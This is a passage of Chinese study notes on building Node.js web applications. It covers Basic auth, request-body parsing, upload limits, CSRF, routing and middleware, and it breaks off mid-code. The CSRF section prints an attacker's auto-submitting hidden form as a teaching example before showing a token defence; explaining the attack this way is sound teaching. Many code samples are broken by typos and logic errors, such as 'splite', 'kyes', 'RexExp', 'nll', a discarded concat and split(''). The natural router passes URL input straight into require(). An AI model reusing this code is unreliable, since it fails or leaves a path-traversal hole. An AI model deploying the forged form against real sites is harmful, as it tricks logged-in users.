  大体来说，根据文件内容的哈数值进行缓存淘汰会更加高效，因为文件内容不一定随着 Web 应用的版本而更新，而文件内容没有更新时，版本号的改动导致的更新毫无意义，因此文件内容形成的 hash 值更精准。

### 8.1.7 Basic 认证

Basic 认证是当客户端与服务器端进行请求时，允许通过用户名和密码实现的一种身份认证方式。这里简要介绍它的原理和服务器端通过 Node 处理的流程。

如果一个页面需要 Basic 认证，它会检查请求报文头中的`Authorization`字段的内容，该字段的值由认证方式和加密值构成。

```sh
curl -v 'http://user:pass@www.baidu.com/'
```

在 Basic 认证中，它会将用户和密码部分结合： `username + ':' + password`。通过进行 Base64 编码：

```js
var encode = function (username, password) {
  return new Buffer(username + ':' + password).toString('base64');
};
```

如果用户首次访问该网页，URL 地址中也没有携带认证内容，那浏览器会相应一个 401 未授权的状态码。

```js

function(req, res) {
  var auth = req.headers['authorization'] || '';
  var parts = auth.splite(' ');
  var method = parts[0] || '';
  var encoded = parts[1] || '',
  var decoded = new Buffer(encoded, 'base64').toString('utf8').splite(':');
  var user = decoded[0];
  var pass = decoded[1];

  if(!checkUser(user, pass)) {
    res.setHeader('WWW-Authenticate', 'Basic realm="Secure ');
    res.writeHead(401);
    res.end();
  } else {
    handle(req, res);
  }
}
```

在上面的代码中看出，响应头的 WWW-Authenticate 字段告诉浏览器采用什么样的认证和加密方式，一般而言，未认证的情况下，浏览器会弹出对话框进行交互信息认证。

当认证通过，服务器端响应 200 状态码后，浏览器会保存用户名和口令密码，在后续的请其中都携带上`Suthorization`信息。

Basic 认证有太多的缺点，它虽然经过 Base64 加密后在网络中传输，但是近乎于明文，十分危险，一般只有在 HTTPS 的情况下才会使用。不过 Basic 认证的支持范围十分广泛，几乎所有的浏览器都支持它。

为了改进 Basic 认证，RFC2069 规范提出了摘要访问认证，它加入了服务器端随机数来保护认证过程，再次不做深入的解释。

## 8.2 数据上传

上述的内容基本都集中在 HTTP 请求报文头中，适用于 GET 请求和大多数其它请求。头部报文中的内容已经能够让服务器端进行大多数业务逻辑操作了，但是单纯的头部报文无法携带大量的数据，在业务中，我们往往需要接收一些数据，比如表单提交、文件提交、JSON 上传、XML 上传等。

Node 的 http 模块只对 HTTP 报文的头部进行了解析，然后触发 request 事件。如果请求中还带有内容部分（比如 POST 请求，它具有报头和内容），内容部分需要用户自行接收和解析。通过报头的 Transfer-Encoding 或 Content-Length 即可判断请求中是否带有内容：

```js
var hasBody = function (req) {
  return 'transfer-encoding' in req.headers || 'content-length' in req.headers;
};
```

在 HTTP_Parser 解析报文结束后，报文内容部分会通过 data 事件触发，我们只需以流的方式处理即可：

```js
function (req, res) {
  if(hasBody(req)) {
    var buffers = [];
    req.on('data', function(chunk) {
      buffers.push(chunk);
    });

    req.on('end', function () {
      req.rawBody = Buffer.concat(buffers).toString();
      handle(req, res);
    });
  } else {
    handle(req, res);
  }
}
```

将接收到的 Buffer 列表转化为一个 Buffer 对象后，再转换为没有乱码的字符串，暂时挂置再 req.rawBody 处。

### 8.2.1 表单数据

最为常见的数据提交就是通过网页表单提交数据到服务器端：

```html
<form action="/upload" method="post">
  <label for="username">Username:</label>
  <input type="text" name="username" id="username" />
  <br />
  <input type="submit" value="Submit" />
</form>
```

默认的表单提交，请求头的 Content-Type 字段值为`application/x-www-form-urlencoded`，它的报文体内容跟查询字符串相同：`foo=bar&baz=val`，因此解析它十分容易：

```js
var handle = function (req, res) {
  if (req.headers['content-type'] === 'application/x-www-form-urlencoded') {
    req.body = querystring.parse(req.rawBody);
  }

  todo(req, res);
};
```

后续业务中直接访问 req.body 就可以得到表单中提交的数据。

### 8.2.2 其它格式

除了表单数据外，常见的提交还有 JSON 和 XML 文件等，判断和解析它们的原理都比较相似，都是依据 Content-Type 中的值决定，其中 JSON 类型的值为`application/json`，XML 的值为`application/xml`。需要注意的是，Content-Type 中可能还附带如下所示的编码信息：

```sh
Content-Type: application/json; charset=utf-8
```

所以判断是，需要注意区分：

```js
var mime = function (req) {
  var str = req.headers['content-type'] || '';
  return str.split(';')[0];
};
```

#### 1.JSON 文件

如果从客户端提交 JSON 内容，这对于 Node 来说，要处理它都不需要额外的任何库：

```js
var handle = function (req, res) {
  if (mime(req) == 'application/json') {
    try {
      req.body = JSON.parse(req.rawBody);
    } catch (e) {
      // 异常内容
      res.writeHead(400);
      res.end('Invalid JSON');
      return;
    }
  }
  todo(req, res);
};
```

#### 2. 解析 XML 文件稍微复杂一点，但是社区有支持 XML 文件到 JSON 对象转换的库，这里以 xml2js 模块为例：

```js
var xml2js = require('xml2js');

var handle = function (req, res) {
  if (mime(req) === 'application/xml') {
    xml2js.parseString(req.rawBody, function (err, xml) {
      if (err) {
        res.writeHead(400);
        res.end('Invalid XML');
        return;
      }

      req.body = xml;
      todo(req, res);
    });
  }
};
```

采用类似的方式，无论客户端提交的数据是什么格式，我们都通过这种方式来判断该数据是何种类型，然后采用对应的解析方法解析即可。

### 8.2.3 附件上传

除了常见的表单和特殊格式的内容提交外，还有一种比较独特的表单。通常的表单，其内容可以通过 urlencoded 的方式编码内容形成报文体，再发送给服务器端，但是业务场景往往需要用户直接提交文件。在前端 HTML 代码中，特殊表单与普通表单的差异在于该表单中可以含有 file 类型的空间，以及需要指定表单属性 enctype 为`multipart/form-data`：

```html
<form action="/upload" method="post" enctype="multipart/form-data">
  <label for="username">Username:</label>
  <input type="text" name="username" id="username" />
  <br />
  <input type="submit" value="Submit" />
</form>
```

浏览器在遇到`multipart/form-data`表单提交时，构造的请求报文与普通表单完全不同。首先它的包头中最为特殊的如下：

```sh
Conten-Type: multipart/form-data; boundary=AaBO3x
Content-Length: 18231
```

它代表本次提交的内容时由多部分组成，其中`boundary=AaBO3x`指定的每部分内容的分界符，AaBO3x 是随机生成的一段字符串，报文体的内容将通过在它面前添加`--`进行分割，报文结束时在它前后加上`--`标识结束。另外 Content-Length 的值必须确保是报文体的长度。

假设上面的表单选择了一个名为`diveintonode.js`的文件，并进行提交上传，那么生成的报文体：

```sh
--AaBO3x\r\n
Content-Type-Disposition: form-data; name="username"\r\n
\r\n
Jackson Tian\r\n
--AaBO3x\r\n
Content-Type-Disposition: form-data; name="file";filename="diveintonode.js"\r\n
Content-Type: application/javascript\r\n
\r\n
... cotents of diveintonode.js ...
--AaBO3x--
```

第一段为普通表单控件的报文体，第二段为文件控件形成的报文体。一旦我们知晓报文是如何构成的，那么解析它就变得十分容易。值得注意的一点，由于是文件上传，那么像普通表单、JSON 或 XML 那样先接收内容再解析的方式将变得不可接受。接收大小未知的数据量时，我们需要十分谨慎：

```js
function (req, res) {
  if(hasBody(req)) {
    var done = function () {
      handle(req, res);
    };

    if(mime(req) === 'application/json') {
      parseJSON(req, done);
    } else if(mime(req) === 'application/xml') {
      parseXML(req, done);
    } else if(mime(req) === 'multipart/form-data') {
      parseMultipart(req, done);
    }
  } else {
    handle(req, res);
  }
}
```

这里我们将 req 这个流对象直接交给对应的解析方法，由解析方法自行处理上传的文件，或接收内容并保存再内存中，或流式处理掉。

这里要介绍到的模块是 formidable。它基于流式处理解析报文，将接收到的文件写入到系统的临时文件夹，并返回对应的路径：

```js
var fomidable = require('formidable');
function (req, res) {
  if(hasBody(req)) {
    if(mime(req) === 'multipart/form-data') {
      var form = new formidable.IncomingForm();
      form.parse(req, function (err, fields, files) {
        req.body = fields;
        req.files = files;
        handle(req, res);
      });
    }
  } else {
    handle(req, res);
  }
}
```

因此在业务逻辑中只要检查 req.body 和 req.files 中的内容即可。

### 8.2.4 数据上传与安全

Node 提供了相对底层的 API，通过它构建各种各样的 Web 应用都是相对容易的，但是在 Web 应用中，不得不重视与数据上传相关的安全问题。由于 Node 与前端 JavaScript 的近缘性，前端 JavaScropt 甚至可以上传到服务器直接执行，但是这里我们并不讨论这样危险的动作，而是介绍内存和 CSRF 相关的安全问题。

#### 1.内存限制

在解析表单、JSON 和 XML 部分，我们采用的策略是先保存用户提交的所有数据，然后再解析处理，然后才传递给业务逻辑。这种策略存在的潜在问题是，它仅仅适合数据量小的提交请求，一旦数据量过大，将发生内存被占光的情况。攻击者通过客户端能够十分容易地模拟伪造大量数据，如果攻击者每次提交 1MB 地内容，那么只要并发请求数量一大，内存就会很快被吃光。要解决这个问题，主要有两个方案：

- 限制上传文件的大小，一旦超过限制，停止接受数据，并响应 400 状态码。
- 通过流式解析，将数据流导向磁盘中，Node 只保留文件路径等小数据。

流式处理在上文的文件上传中已经有所体现，这里介绍一下 Connect 中采用的上传数据量的限制方式：

```js
var bytes = 1024;

function (req, res) {
  var reveived = 0;
  var len = req.headers['content-length'] ? parseInt(req.headers['content-length'], 10) : null;

  // 如果内容超过长度限制，返回请求实体过程的状态码
  if(len && len > bytes) {
    res.writeHead(413);
    res.end();
    return;
  }

  // limit
  req.on('data', function (chunk) {
    received += chunk.length;
    if(received > bytes) {
      // 停止接收数据，触发 end()
      req.destroy();
    }
  });

  handle(req, res);
}
```

从上面的代码我们可以看出，数据是由包含 Content-Length 的请求报文判断是否长度超过限制，超过则直接响应 413 状态码。对于没有 Content-Length 的请求报文，略微简略一点，在每个 data 事件中判定即可。一旦超过限制值，服务器停止接收新的数据片段。如果是 JSON 文件或 XML 文件，极有可能无法完成解析。对于上限的 Web 应用，添加一个上传大小限制十分有利于保护服务器，在遭遇攻击时，能镇定从容因应对。

#### 2.CSRF

CSRF 的全程是 Cross-Site Request Forgery，中文意思为跨站请求伪造。前文提及了服务器端与客户端通过 Cookie 来标识和认证用户，通常而言，用户通过浏览器访问服务器端的 Session ID 是无法被第三方知道的，但是 CSRF 的攻击者并不需要知道 Session ID 就能让用户中招。

为了详细解释 CSRF 攻击时怎样一个过程，我们这里以一个留言的例子来说明。假设某个网站有这样一个留言程序。用户通过 POST 提交 content 字段就能成功留言。服务器端会自动从 Session 数据中判断是谁提交的数据，补足 username 和 updateAt 这两个字段后向数据库中写入数据：

```js
// http://domain_a.com/guestbook

function (req, res) {
  var content = req.body.content || '';
  var username = req.session.username;
  var feedback = {
    username: username,
    content: content,
    updateAt: Date.now()
  };

  db.save(feedback, function (err) {
    res.writeHead(200);
    res.end('Ok');
  });
}
```

正常情况下，谁提交的留言，就会出现在列表中显示谁的信息。如果某个攻击者发现了这里的接口存在 CSRF 漏洞，那么他就可以在另一个网站（`http://domain_b.com/attack`)上构造一个表单提交，如下所示：

```html
<form id="test" method="post" action="http://doman_a.com/guestbook">
  <input type="hidden" name="content" value="vim是这个世界上最好的编辑器" />
</form>
<script type="text/javascript">
  $(function () {
    $('#test').submit();
  });
</script>
```

这种情况下，攻击者只要引诱某个 domain_a 的登录用户访问这个 domain_b 的网站，就会自动提交一个留言。由于在提交到 domain_a 的过程中，浏览器会将 domain_a 的 Cookie 发送到服务器，尽管这个请求来自于 domain_b，但是服务器并不知情，用户也不知情。

以上过程就是一个 CSRF 攻击的过程。这里的示例仅仅是一个留言的漏洞，如果出现漏洞的是转账的接口，那么其危害程度可想而知。

尽管通过 Node 接收数据提交十分容易，但是安全问题还是不容忽视。好在 CSRF 并非不可防御，解决 CSRF 攻击的方案是添加随机值的方式：

```js
var generateRandom = function (len) {
  return crypto
    .randomBytes(Math.ceil((len * 3) / 4))
    .toString('base64')
    .slice(0, len);
};
```

也就是说，为每个请求的用户，在 Sessin 中赋予一个随机值：

```js
var token = req.session_csrf || (req.session_csrf = generateRandom(24));
```

在做新页面渲染的过程中，将这个 csrf 值告诉前端：

```html
<form action="http://domain_a.com/guestbook" method="post" id="test">
  <input type="hidden" name="content" value="vim是这个世界上最好的编辑器" />
  <input type="hidden" name="_csrf" value="<%= _csrf %>" />
</form>
```

由于该值是一个随机值，攻击者构造出相同的随机值难度相当大，所以我们只需要在接收端做一次校验就能轻易地识别出该请求是否伪造：

```js
function (req, res) {
  var token = req.session._csrf || (req.session._csrf = generateRandom(24));

  var_csrf = req.body._csrf;
  if(token !== _csrf) {
    res.writeHead(403);
    res.end('禁止访问');
  } else {
    handle(req, res);
  }
}
```

\_csrf 字段也可以存在于查询字符串或者请求头中。

## 8.3 路由解析

前文讲述了需求多 Web 请求过程中地预处理过程，对于不同的业务，我们还是期望有不同的处理方式，这带来了路由选择问题。本节将会介绍文件路径、MVC、RESTful 等路由方式。

### 8.3.1 文件路径型

#### 1.静态文件

这种方式的路由在路径解析的部分有过简单描述，其让人舒服的地方在于 URL 的路径与网站目录路径一直，无须转换，非常直观。这种路由的处理方式也十分简单，将请求路径对应的文件发送给客户端即可。这在前文路径解析部分有做介绍，不再重复。

#### 2.动态文件

在 MVC 模式流行起来之前，根据文件路径执行动态脚本也是基本的路由方式，它的处理原理是 Web 服务器根据 URL 路径找到对应的文件，比如`/index.asp`或`/index.php`。Web 服务器根据文件名后缀去寻找脚本解析器，并传入 HTTP 请求的上下文。

Apache 中配置 PHP 支持的方式：`addType application/x-httpd-php .php`。

解析器执行脚本，并输出响应报文，达到完成服务的目的。现今大多数的服务器都能很智能地根据后缀同时服务动态和静态文件。这种方式在 Node 中不太常见，主要原因是文件的后缀都是 js，分不清是后端脚本还是前端脚本，这可不是什么好的设计。而且 Node 中 Web 服务器与应用业务脚本是一体的，无须按照这种方式实现。

### 8.3.2 MVC

在 MVC 流行之前，主流的处理方式都是通过文件路径进行处理的，甚至以为是常态。直到有一天开发者发现用户请求的路径原来可以跟脚本所在的路径没有任何关系。

MVC 模型的主要思想是将业务逻辑按职责分离，主要分为以下几种：

- 控制器（Controller），一组行为的集合。
- 模型（Model），数据相关的操作和封装。
- 视图（View），视图的渲染。

这时目前最经典的分层模式，大致而言，它的工作模式有如下说明：

- 路由解析，根据 URL 寻找敌营的控制器和行为。
- 行为调用相关模型，进行数据操作。
- 数据操作结束后，调用视图和相关数据进行页面渲染，输出到客户端。

控制器如何使用模型和如何渲染页面，各种实现都大同小异，我们在后续章节中再展开，此处暂且略过。如何根据 URL 做路由映射，这里有两个分支实现。一种方式是通过手工关联映射，一种是自然关联映射。前者会有一个对应的路由文件来将 URL 映射到对应的控制器，后者没有这样的文件。

#### 1.手工映射

手工映射除了需要手工配置路由较为原始外，它对 URL 的要求十分灵活，几乎没有格式上的限制。如下的 URL 格式都能自由映射：

```sh
/user/setting
/setting/user
```

这里假设已经拥有了一个处理设置用户信息的控制器：

```js
exports.setting = function (req, res) {
  // TODO
};
```

再添加一个映射的方法就行，为了方便后续的行文，这个方法名叫`use()`：

```js
var routes = [];

var use = function (path, action) {
  routes.push([path, action]);
};
```

我们在入口程序中判断 URL，然后执行对应的逻辑，于是就完成了基本的路由映射过程：

```js
function (req, res) {
  var pathname = url.parse(req.url).pathname;
  for (var i = 0; i < routes.length; i++) {
    var route = routes[i];

    if(pathname === route[0]) {
      var action = route[1];
      action(req, res);
      return;
    }
  }
  // 处理404请求
  handle404(req, res);
}
```

手工映射十分简单，由于它对 URL 十分灵活，我们可以将两个路径分别映射到相同的业务逻辑：

```js
use('/user/setting', exports.setting);
use('/setting/user', exports.setting);
// 甚至
use('/setting/user/jacksonTian', exports.setting);
```

- 正则匹配

  对于简单的路径，采用上述的硬匹配方式即可，但是如下的路径请求就无法完全满足需求了：

  ```sh
  /profile/jacksonTian
  /profile/hoover
  ```

  这些请求需要根据不同的用户显示不同的内容，这里只有两个用户，加入系统中存在成千上万个用户，我们不太可能去手工维护所有用户的路由请求，因此正则匹配应运而生，我们期望通过以下的方式就可以去匹配到任意用户：

  ```js
  use('/profile/:username', function (req, res) {
    // TODO
  });
  ```

  于是我们改进了我们的匹配方式，在通过 use 注册路由时，需要将路径转换为一个正则表达式，然后通过它来进行匹配：

  ```js
  var pathRegexp = function (path) {
    path = path.
      .concat(strict ? '':'/?')
      .replace(/\/\(/g, '(?:/')
      .replace(/(\/)?:(\w+)(?:(\(.*?\)))?(\?)(\*)?/g, function (_, slash, format, key, capture, optional, star) {
        slash = slash || '';
        return ''
          + (optional ? '' : slash)
          + '(?:'
          + (optional ? slash : '')
          + (format || '') + (capture || (format && '([^/.]+?)' || '([^/]+?)')) + ')'
          + (optional || '')
          + (star ? '(/*)?' : '');
      })
      .replace(/([\/.])/g, '\\$1')
      .replace(/\*/g, '(.*)');

      return new RegExp('^' + path + '$');
  }
  // 上述正则表达式十分复杂，总体而言，他能实现如下的匹配：
  // /profile/:username => /profile/jacksonTian, /profile/hoover
  // /user.:ext => /user.xml, /user.json
  ```

  现在我们重新改进注册部分：

  ```js
  var use = function (path, action) {
    routes.push([pathRegexp(path), action]);
  };

  // 以及匹配部分：
  function (req, res) {
    var pathname = url.parse(req.url).pathname;
    for (var i = 0; i < routes.length; i++) {
      var route = routes[i];

      // 正则匹配
      if(route[0].exec(pathname)) {
        var action = route[1];
        action(req, res);
        return;
      }
    }

    // 处理404
    handle404(req, res);
  }
  ```

  现在我们的路由功能能够通过正则匹配了，无须再次为大量的用户进行手工路由映射了。

- 参数解析

  尽管完成了正则匹配，可以实现相似 URL 的匹配，但是`:username`到底匹配了啥，还没有解决。为此我们还需要进一步将匹配到的内容抽离，希望在业务中能如下调用：

  ```js
  use('/profile/:username', function (req, res) {
    var username = req.params.username;
    //TODO
  });
  ```

  这里的目标事将抽取的内容设置到`req.params`里。那么第一步就是将键值抽取出来：

  ```js
  var pathRegexp = function (path) {
    var keys = [];

    path = path
      .concat(strict ? '' : '/?')
      .replace(/\/\(/g, '(?:/')
      .replace(/(\/)?(\.)?:(\w+)(?:(\(.*?\)))?(\?)?(\*)?/g, function (
        _,
        slash,
        format,
        key,
        capture,
        optional,
        star
      ) {
        // 将匹配到的键值保存起来：
        kyes.push(key);
        slash = slash || '';
        return (
          '' +
          (optional ? '' : slash) +
          '(?:' +
          (optional ? slash : '') +
          (format || '') +
          (capture || (format && '([^/.]+?)') || '([^/]+?)') +
          ')'
        );
        +(optional || '') + (star ? '(/*)?' : '');
      })
      .replace(/([\/.])/g, '\\$1')
      .replace(/\*/g, '(.*)');

    return {
      keys: keys,
      regexp: new RexExp('^' + path + '$'),
    };
  };
  ```

  我们将根据抽取的键值和实际的 URL 得到键值匹配的实际值，并设置到 req.params。

  至此，我们除了从查询字符串（req.query）或提交数据（req.body）中取到值，还能从路径的映射中取到值。

#### 2. 自然映射

手工映射的店在于路径可以很灵活，但是如果项目较大，路由映射的数量也会很多。从前端路由到具体的控制器文件，需要进行查阅才能定位到实际代码的位置，为此有人提出，尽失路由不如无路由。实际上并非五路由，而是路由按一种约定的方式自然而然实现路由，而无须去维护路由的映射。

上文的解析路径部分对于这种自然路由的实现有稍许介绍，简单而言，它将如下路径进行了划分：`/controler/action/param1/param2/param3`,以`/user/setting/12/1987`为例，而其余的值作为参数直接传递给这个方法。

```js
function (req, res) {
  var pathname = url.parse(req.url).pathname;
  var paths = pathname.split('');
  var controller = paths[1] || 'index';
  var action = paths[2] || 'index';
  var args = paths.slice(3);
  var module;

  try {
    // require 的缓存机制使得只有第一次是阻塞的
    module = require('./controllers/' + controller);
  } catch (e) {
    handle500(req, res);
    return;
  }

  var method = module[action];
  if(method) {
    method.apply(nll, [req, res].concat(args));
  } else {
    handle500(req, res);
  }
}
```

由于这种自然映射的方式没有指明参数的名称，所以无法采用 req.params 的方式提取，但是直接通过参数获取更简洁：

```js
exports.setting = function (req, res, month, year) {
  // 如果路径为 /user/setting/12/1987，那么month为12，year为1987
  // TODO
}；
```

事实上，手工映射也能将值作为参数传递，而不是通过`req.params`。但是这个观点见仁见智，这里不做比较和讨论。

自然映射这种路由方式在 PHP 的 MVC 框架 CodeIgniter 中应用十分广泛，设计十分简洁，在 Node 中实现它也十分容易。与手工映射相比，如果 URL 变动，它的文件也需要发生变动，手工映射只需要改动路由映射即可。

### 8.3.3 RESTful

MVC 模式大行其道很多年，直到 RESTful 的六咸亨，大家才意识到 URL 也可以设计得很规范，请求方法也能作为逻辑分发单元。

REST 得全称是 Representational Stete Transfer，中文含义为表现层状态转化。符合 REST 规范得设计，我们称为 RESTful 设计。它的设计哲学主要将服务器端提供的内容看作一个资源，并表现在 URL 上。如一个用户地址：`/users/jacksonTian`，这个地址代表了一个资源，对这个资源的操作，主要体现在 HTTP 请求方法上，不是体现在 URL 上。过去我们对用户增删改查或许是如下设计：

```sh
POST /user/add?username=jacksonTian
GET /user/remove?username=jacksonTian
POST /user/update?username=jacksonTian
GET /user/get?username=jacksonTian
```

操作行为主要体现在行为上，主要使用的请求方法是 POST 和 GET。在 RESTful 设计中，它是如下：

```sh
POST /user/jacksonTian
DELETE /user/jacksonTian
PUT /user/jacksonTian
GET /user/jacksonTian
```

它将 DELETE 和 PUT 请求方法引入设计中，参与资源的操作和更改资源状态。对于这个资源的具体表现形态，也不再如过去一样表现在 URL 的文件后缀上。过去设计资源的格式与后缀有很大的关联：

```sh
GET /user/jacksonTian.json
GET /user/jacksonTian.xml
```

在 RESTful 设计中，资源的具体格式是由请求报头中的 Accept 字段和服务器端的支持情况来就饿顶。如果客户端同时接收 JSON 和 XML 格式的响应，那么它的 Accept 字段值应该是：`Accept: application/json,application/xml`。

靠谱的服务器端应该要顾及这个字段，然后根据自己能响应的格式做出响应。在响应报文中，通过 Content-Type 字段告知客户端时什么格式：`Content-Type: application/json`。

具体格式，我们称之为具体的表现。所以 REST 的设计就是，通过 URL 设计资源、请求方法定义资源的操作，通过 ACCept 决定资源的表现。

RESTful 与 MVC 设计并不冲突，而且时更好的改进。相比 MVC，RESTful 只是将 HTTP 请求方法也加入了路由的过程，以及在 URL 路径上体现得更资源化。

- 请求方法

  为了让 Node 能够支持 RESTful 需求，我们改进了我们的设计。如果 use 是对所有请求方法的处理，那么在 RESTful 的场景下，我们需要区分请求方法设计。

  ```js
  var routes = { all: [] };
  var app = {};
  app.use = function (path, action) {
    routes.all.push([pathRegexp(path), action]);
  };

  ['get', 'put', 'delete', 'post'].forEach(function (method) {
    routes[method] = {};
    app[method] = function (path, action) {
      routes[method].push([pathRegexp(path), action]);
    };
  });
  ```

  上面的代码添加了`get()`、`put()`、`delete()`、`post()`4 个方法后，我们希望通过如下的方式完成映射：

  ```js
  // 增加用户
  app.post('/user/:username', addUser);
  // 删除用户
  app.delete('/user/:username', removeUser);
  // 修改用户
  app.put('/user/:username', updateUser);
  // 查询用户
  app.get('/user/:username', getUser);
  ```

  这样的路由能够识别请求方法，并将业务进行分发。为了让分发部分更简洁，我们先将匹配的部分抽取为`match()`方法：

  ```js
  var match = function (pathname, routes) {
    for (var i = 0; i < routes.length; i++) {
      var route = routes[i];

      // 正则匹配
      var reg = route[0].regexp;
      var keys = route[0].keys;
      var matched = reg.exec(pathname);
      if (matched) {
        // 抽取具体值
        var params = {};
        for (var i = 0; i < keys.length; i++) {
          var value = matched[i + 1];
          if (value) params[key[i]] = value;
        }
        req.params = params;

        var action = route[1];
        action(req, res);
        return true;
      }
    }
    return false;
  };
  ```

  然后改进我们的分发部分：

  ```js
  function (req, res) {
    var pathname = url.parse(req.url).pathname;

    // 将请求方法小写
    var method = req.method.toLowerCase();
    if(routes.hasOwnProperty(method)) {
      // 根据请求方法分发
      if(match(pathname, routes[method])) {
        return;
      } else {
        // 如果路径没有匹配成功，尝试让all来处理
        if（match(pathname, routes.all)）
          return;
      }
    } else {
      // 直接让all处理
      if(match(pathname, routes.all))
        return;
    }
    // 处理404
    handle404(req, res);
  }
  ```

  如此，我们完成了实现 RESTful 支持的必要条件。这里的实现过程采用了手工映射的方法完成，事实上通过自然映射也能完成 RESTful 的支持，但是更具 Controller/Action 的约定必须要转化为 Resource/Method 的约定，此处已经引出实现思路，不再详述。

目前 RESTful 应用已经开始广泛起来，随着业务逻辑前端话、客户端的多样化，RESTful 模式以其轻量的设计，得到了广大开发者的青睐。对于多数的应用而言，只需要构建一套 RESTful 服务接口，就能使用移动端、PC 端的各种客户端。

## 8.4 中间件

片段式地接触玩 Web 应用地基础功能和路由功能后，我们从响应 Hello World 地示例代码到实际的项目，其实有太多琐碎的细节工作要完成，上述内容只是介绍了主要的的部分。对于 Web 应用而言，我们希望不用接触到这么多细节性的处理，为此我们引入中间件(middleware)来简化和隔离这些基础设施与业务逻辑之间的细节，让开发者能够更关注在业务上的开发，以达到提升开发效率的目的。

在最早的中间件的定义中，它是一种在操作系统上为应用软件提供服务的计算机软件。它既不是操作系统的一部分，也不是应用软件的一部分，它处于操作系统和应用软件中间，让应用软件更好、更方便的使用底层服务。如见中间件的定义借指了这种封装底层细节，为上层提供更方便服务的意义，并非限定在操作系统层面。这里提到的中间件，就是为我们封装上文提及的所有 HTTP 请求细节处理的中间件，开发者可以脱离这部分细节，专注在业务上。

中间件的行为比较类似 Java 中的过滤器(filter)的工作原理，就是在进入具体的业务处理之前，先让过滤器处理。从 HTTp 请求到具体业务逻辑之间，其实有很多的细节要处理。Node 的 http 模块提供了应用层协议网络的封装，对具体业务并没有支持，在业务逻辑之下，必须有开发框架对业务提供支持。这里我们通过中间件的形式搭建开发框架，这个开发框架用来组织各个中间间。对于 Web 应用的各种基础功能，我们通过中间件来完成，每个中间件处理掉相对简单的逻辑，最终汇成强大的基础框架。

由于中间件就是前述的基础功能，所以它的上下文也就是请求对象和响应对象：req 和 res。有一点区别的是，由于 Node 异步的原因，我们需要提供一种机制，在当前中间件处理完成后，通知下一个中间件执行。在第 4 章中其实已经对中间件做了介绍，这里我们还是采用 Connect 的设计，通过尾触发的方式实现。一个基本的中间件会是如下形式：

```js
var middleware = function (req, res, next) {
  // TODO

  next();
};
```

按照预期的设计，我们为具体的业务逻辑添加中间件应该是很轻松的事情，通过框架支持，能够将所有的基础功能支持串联起来，如下：

```js
app.use('/user/:usernae', querystring, cookie, session, function (req, res) {
  // TODO
});
```

这里的 querystring、cookie、session 中间件与前文描述的功能大同小异：

```js
// querystring解析中间件
var querystring = function (req, res, next) {
  req.query = url.parse(req.url, true).query;
  next();
};

// cookie解析中间件
var cookie = function (req, res, next) {
  var cookie = req.headers.cookie;
  var coolies = {};
  if (cookie) {
    var list = cookie.split(';');
    for (var i = 0; i < list.length; i++) {
      var pair = list[i].split('=');
      coolie[pair[0].trim()] = pair[1];
    }
  }
  req.cookies = cookies;
  next();
};
```

可以看出这里的中间件都是十分简洁的，接下来我们需要组织这些中间件，这里我们将路由分离开来，将中间件和具体业务逻辑都看成业务处理单元，改进`use()`方法：

```js
app.use = function (path) {
  var handle = {
    // 第一个参数为路径
    path: pathRegexp(path),
    // 其它都是处理单元
    stack: Array.prototype.slice.call(arguments, 1);
  };
  routes.all.push(handle);
};
```

改进后的`use()`方法将中间件都存进了 stack 数组中保存，等待匹配触发执行。由于结构发生改变，那么我们匹配部分也需要进行修改：

```js
var match = function (pathname, routes) {
  for (var i = 0; i < routes.length; i++) {
    var route = routes[i];

    // 正则匹配
    var reg = route.path.regexp;
    var matched = reg.exec(pathname);

    if (matched) {
      // 抽取具体值
      // 代码省略
      // 将中间件数组传递给handle()方法处理
      handle(req, res, routes.stack);
      return true;
    }
  }
  return false;
};
```

一旦匹配成功，中间件具体如何调用都交给了 handle()方法处理，该方法封装后，递归性地执行数组中地中间件，每个中间件执行完毕后，按照约定调用传入 next()方法以触发下一个中间件执行（或者直接响应），直到最后地业务逻辑：

```js
var handle = function (req, res, stack) {
  var next = function () {
    // 从stack数组中取出一个中间件并执行
    var middleware = stack.shift();
    if(middleware) {
      // 传入next() 函数自身，使中间件能够执行结束后递归
      middleware(req, res, next);
    }
  };

  // 启动执行
  next();
}；
```

这里带来的疑问是，像 querystring、cookie、session 这样基础的功能中间件是否需要为每个路由都进行设置呢？如果都设置将会演变成如下的路由配置：

```js
app.get('/user/:username', querystring, cookie, session, getUser);
app.put('/user/:username', querystring, cookie, session, updateUser);
// 更多路由...
```

为每个路由都配置中间件并不是一个好的设计，既然中间件和业务逻辑是等价的，那么我们是否可以将路由和中间件进行结合？设计是否可以更人性？既然照顾普适的需求，又能照顾特殊的需求？答案是 YES：

```js
app.use(querystring);
app.use(cookie);
app.use(session);
app.get('/user/:username', getUser);
app.put('/user/:username', authorize, updateUser);
```

为了满足更灵活的设计，这里持续改进我们的`use()`方法以适应参数的变化：

```js
app.use = function (path) {
  var handle;
  if (typeof path === 'string') {
    handle = {
      // 第一个参数作为路径
      path: pathRegexp(path),
      // 其它都是处理单元
      stack: Array.prototype.slice.call(arguments, 1),
    };
  } else {
    handle = {
      // 第一个参数作为路径
      path: pathRegexp(''),
      // 其它作为处理单元
      stack: Array.prototype.slice.call(arguments, 0),
    };
  }
  routes.all.push(handle);
};
```

除了改进`use()`方法外，还要持续改进我们的匹配过程，与前面一旦一次匹配后就不再执行。后续匹配不同，还会继续后续逻辑，这里我们将所有匹配到中间件的都暂时保存起来：

```js
var match = function (pathname, routes) {
  var stacks = [];
  for (var i = 0; i < routes.length; i++) {
    var route = routes[i];

    // 正则匹配
    var reg = route.path.regexp;
    var matched = reg.exec(pathname);

    if (matched) {
      // 抽取具体值，代码省略

      // 将中间件都存起来
      stacks = stacks.concat(route.stack);
    }
  }
  return stacks;
};
```

改进完`use()`方法后，还要持续改进分发的过程：

```js
function (req, res) {
  var pathname = url.parse(req.url).pathhname;
  var method = req.method.toLowerCase();
  // 获取all方法里的中间件
  var stacks = match(pathname, routes.all);
  if(routes.hasOwnProperty(method)) {
    // 根据请求方法分发，获取相关中间件
    stacks.concat(match(pathname, routes[method]));
  }

  if(stacks.length)
    handle(req, res, stacks);
  else
    handle404(req, res);// 处理404请求
}
```

综上所述，通过中间件和路由的协作，我们不知不觉间已经将复杂的事情简化下来，Web 应用开发者可以只关注业务开发就能胜任整个开发工作。

#### 8.4.1 但是等等，如果某个中间件出现错误该怎么办？我们需要为自己构建的 Web 应用的稳定性和健壮性负责。于是我们为 next 方法添加 err 参数，并捕获中间件直接抛出的同步异常：

```js
var handle = function (req, res, stack) {
  var next = function (err) {
    if(err)
      return handle500(err, req, res, stack);

    // 从stack数组中取出中间件并执行
